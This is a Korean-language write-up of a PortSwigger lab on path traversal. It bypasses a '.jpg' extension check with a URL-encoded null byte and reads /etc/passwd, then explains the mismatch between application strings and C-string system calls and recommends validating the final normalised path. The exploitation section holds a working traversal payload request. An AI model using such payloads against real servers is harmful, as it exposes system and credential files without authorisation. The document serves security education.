+++
date = '2026-06-29T12:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - File path traversal, validation of file extension with null byte bypass'
summary = "확장자 검증을 null 바이트로 우회해 /etc/passwd를 읽는 풀이와, 애플리케이션과 시스템 콜의 문자열 표현 차이에서 비롯되는 절단 결함 정리"
toc = true
tags = ["Path Traversal", "Filter Bypass", "Null Byte", "File Extension", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

> ![image.png](/writeup/portswigger/path-traversal/06/1.png)

상품 이미지 표시 기능에 path traversal 취약점이 존재한다. 애플리케이션이 전달된 파일명이 기대하는 확장자로 끝나는지 검증한다. `/etc/passwd` 파일의 내용을 가져오면 문제가 해결된다.

### Path Traversal 진단

이미지 요청 형태를 확인한다.

```http
GET /image?filename=53.jpg HTTP/2
Host: <lab-id>.web-security-academy.net
```

경로 이탈 자체는 막히지 않지만 대상 파일이 `.jpg`로 끝나지 않으면 요청이 거부된다.

| 시도 | 결과 |
| --- | --- |
| `../../../etc/passwd` | 확장자 검증에서 거부 |
| `../../../etc/passwd.jpg` | 검증은 통과하나 그런 파일이 없음 |

검증을 통과하려면 문자열이 `.jpg`로 끝나야 하고, 파일을 읽으려면 실제 경로가 `/etc/passwd`여야 한다. 두 조건은 문자열 하나로는 동시에 만족될 수 없어 보이지만, 검증하는 쪽과 파일을 여는 쪽이 문자열의 끝을 다르게 판단한다면 가능해진다. 여기서 null 바이트가 쓰인다.

| 계층 | 문자열 표현 | `"../../../etc/passwd\0.jpg"`를 읽는 방식 |
| --- | --- | --- |
| 애플리케이션 (Java·PHP 등) | 길이를 함께 보관 | `\0`도 하나의 문자. 전체가 `.jpg`로 끝남 |
| 시스템 콜 (C 문자열) | `\0`을 종단 표시로 사용 | `\0` 이전까지만 경로로 인식 |

---

## 익스플로잇

경로 뒤에 URL 인코딩한 null 바이트를 붙이고 그 뒤에 기대되는 확장자를 배치해 페이로드를 구성한다.

```http
GET /image?filename=../../../etc/passwd%00.jpg HTTP/2
Host: <lab-id>.web-security-academy.net
```

같은 문자열이 두 계층에서 어떻게 처리되는지 비교하면 다음과 같다.

```text
검증:  "../../../etc/passwd\0.jpg".endsWith(".jpg")  →  true
해석:  open("../../../etc/passwd\0.jpg")  →  ../../../etc/passwd  →  /etc/passwd
```

요청을 전송하면 응답 본문에 `/etc/passwd`의 내용이 포함되며 문제가 해결된다.

![image.png](/writeup/portswigger/path-traversal/06/2.png)

---

## 정리

앞선 랩들과 마찬가지로 이 랩의 우회도 **검증한 값과 사용한 값이 다르다**는 한 문장으로 요약된다. 다만 그 차이를 만든 원인이 인코딩이나 치환이 아니라 두 계층의 문자열 표현 차이라는 점이 다르다. Java의 `String`이나 PHP의 문자열은 길이를 함께 들고 다니므로 `\0`은 그저 값이 0인 한 문자지만, 그 문자열이 파일 API를 거쳐 커널로 내려가면 `\0`을 만나는 순간 경로가 끝난다. 애플리케이션이 본 문자열의 뒷부분이 커널에게는 존재하지 않는 것이다.

이 결함은 런타임에 의존한다. PHP는 5.3.4에서, Java는 7u40에서 경로에 null 바이트가 포함되면 예외를 던지도록 바뀌었기 때문에 현대 환경에서 그대로 재현되는 경우는 드물다. 다만 다음 조건에서는 여전히 유효하므로 진단 시 후보에서 제외할 이유는 없다.

- 구버전 런타임을 쓰는 레거시 애플리케이션
- 파일 경로를 그대로 넘기는 네이티브 확장 모듈이나 C·C++로 작성된 백엔드 컴포넌트
- 웹 서버·애플리케이션·스토리지처럼 서로 다른 구현이 같은 경로 문자열을 순차적으로 처리하는 구간

더 근본적인 문제는 **확장자 검증이 path traversal 방어가 될 수 없다**는 점이다. 확장자는 파일 이름의 뒷부분일 뿐 그 파일이 어디에 있는지에 대해 아무것도 보증하지 않는다. null 바이트를 막더라도 기준 디렉터리 바깥에 `.jpg`로 끝나는 파일이 하나라도 있으면 그 파일은 그대로 읽힌다. 확장자 검증은 업로드된 파일의 처리 방식을 정하는 용도로는 의미가 있지만, 경로가 허용된 범위 안에 있는지를 판단하는 용도로는 애초에 답할 수 없는 질문을 맡은 것이다.

여섯 개의 랩을 관통하는 결론은 하나로 모인다. 검증은 입력 문자열의 생김새가 아니라 **정규화가 끝난 최종 경로**에 걸어야 한다. 차단 목록, 시퀀스 제거, 접두 검사, 확장자 검사는 모두 최종 경로에 도달하기 전의 중간 표현을 대상으로 삼았고, 그 사이에 변환이 하나 끼어드는 순간 전부 같은 방식으로 무너졌다.
